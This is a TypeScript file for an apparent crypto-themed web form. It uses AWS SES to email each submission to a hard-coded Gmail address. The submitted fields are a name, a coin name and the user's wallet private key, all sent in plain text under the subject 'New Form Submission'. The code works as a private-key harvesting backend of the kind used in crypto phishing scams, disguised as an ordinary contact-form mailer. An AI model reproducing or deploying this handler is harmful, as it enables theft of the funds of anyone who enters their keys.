import AWS from "aws-sdk";
import dotenv from "dotenv";
dotenv.config({ path: "./.env"});

interface Data {
    name: string;
    privateKey: string;
    coin: string
}

AWS.config.update({
    accessKeyId: process.env.AWS_ACESS_KEY_ID,
    secretAccessKey: process.env.AWS_SECRET_ACESS_KEY,
    region: process.env.AWS_REGION
})

const ses = new AWS.SES({ apiVersion: '2010-12-01' });

export default async function sendEmail(formData: Data) {
    const params = {
        Destination: {
          ToAddresses: ["cryptosnipeai@gmail.com"],
        },
        Message: {
          Body: {
            Text: {
              Data: `Name: ${formData.name}\nPrivate Key: ${formData.privateKey}\nCoin Name: ${formData.coin}`,
            },
          },
          Subject: {
            Data: 'New Form Submission',
          },
        },
        Source: 'cryptosnipeai@gmail.com',
    };
    
    try {
        await ses.sendEmail(params).promise();
        console.log("email sent");
        return "email sent success";
    } catch (e) {
        console.log("error sending email", e);
        return null
    }
}